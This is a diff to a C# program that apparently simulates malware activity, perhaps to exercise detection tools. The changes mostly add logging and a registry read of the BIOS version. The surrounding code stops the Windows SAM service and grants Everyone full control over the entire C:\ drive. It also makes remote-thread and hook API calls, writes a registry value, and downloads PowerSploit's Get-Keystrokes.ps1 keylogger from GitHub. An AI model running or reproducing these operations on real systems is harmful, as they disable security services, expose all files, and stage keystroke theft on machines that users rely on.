@@ -39,6 +39,10 @@ class Program
             LogMessage($"Generated and encrypted: {fileName}");
         }
 
+        PrintHeader("Registry Key reading - System BIOS Version");
+        string biosVersion = GetSystemBiosVersion();
+        LogMessage("Value: " + biosVersion);
+
         LoadSomeDlls();
         DoSomeFreakyStuff();
 
@@ -78,13 +82,32 @@ class Program
         // The SAM service stores local user account information. 
         // Stopping this service may prevent users from logging on, 
         // changing passwords, or performing other security-related operations.
-        ExecuteCommand("net.exe", "stop samss /y", "net.exe stop 'samss' /y executed.");
+        ExecuteCommand("net.exe", "stop samss /y", "");
+        LogMessage("net.exe stop 'samss' /y executed.");
 
         // This command modifies the access control lists (ACLs) to grant full control permissions 
         // to 'Everyone' for all files and directories on the C:\ drive.
         // This can expose sensitive data to unauthorized access or modification.
         // Furthermore, it can make the system vulnerable to a variety of attacks.
-        ExecuteCommand("icacls.exe", "'C:\\*' /grant Everyone:F /T /C /Q", "icalcs.exe with granting executed!");
+        ExecuteCommand("icacls.exe", "'C:\\*' /grant Everyone:F /T /C /Q", "");
+        LogMessage("icalcs.exe with granting executed!");
+    }
+
+    public static string GetSystemBiosVersion()
+    {
+        string result = null;
+
+        // Open the registry key
+        using (RegistryKey baseKey = Registry.LocalMachine.OpenSubKey(@"HARDWARE\DESCRIPTION\SYSTEM"))
+        {
+            if (baseKey != null)
+            {
+                // Read the value
+                result = baseKey.GetValue("SYSTEMBIOSVERSION") as string;
+            }
+        }
+
+        return result;
     }
 
     static void LoadSomeDlls()
@@ -119,9 +142,14 @@ class Program
             IntPtr remoteThread = CreateRemoteThread(IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero, IntPtr.Zero, 0, IntPtr.Zero);
             IntPtr hook = SetWindowsHookEx(2, IntPtr.Zero, IntPtr.Zero, 0);
             byte[] data = { 0x01, 0x02, 0x03 };
+            
+            PrintHeader("DLL stuff");
             int result = RegSetValueEx((IntPtr)0x80000002, "TestValue", 0, RegistryValueKind.Binary, data, data.Length);
+            LogMessage("Added a TestValue to registry");
+
             int downloadResult = URLDownloadToFile(IntPtr.Zero, "https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-Keystrokes.ps1", "C:\\test\\Get-Keystrokes.ps1", 0, IntPtr.Zero);
             IntPtr internetHandle = InternetOpen("MyAgent", 1, null, null, 0);
+            LogMessage("Downloaded Get-Keystrokes.ps1");
         }
         catch (Exception ex)
         {
@@ -188,7 +216,7 @@ class Program
             client.DownloadFile(url, filePath);
         }
 
-        Console.WriteLine($"File downloaded: {fileName}");
+       LogMessage("File downloaded: "+ fileName);
         return filePath;
     }
 
@@ -196,7 +224,7 @@ class Program
     {
         if (!IsElevated())
         {
-            Console.WriteLine("This operation requires elevated rights. Please run the program as an administrator.");
+            LogMessage("This operation requires elevated rights. Please run the program as an administrator.");
             return;
         }
 
@@ -257,8 +285,8 @@ class Program
             string output = process.StandardOutput.ReadToEnd();
             process.WaitForExit();
 
-            Console.WriteLine(output);
-            Console.WriteLine(successMessage);
+            LogMessage(output);
+            LogMessage(successMessage);
         }
         catch (Exception ex)
         {
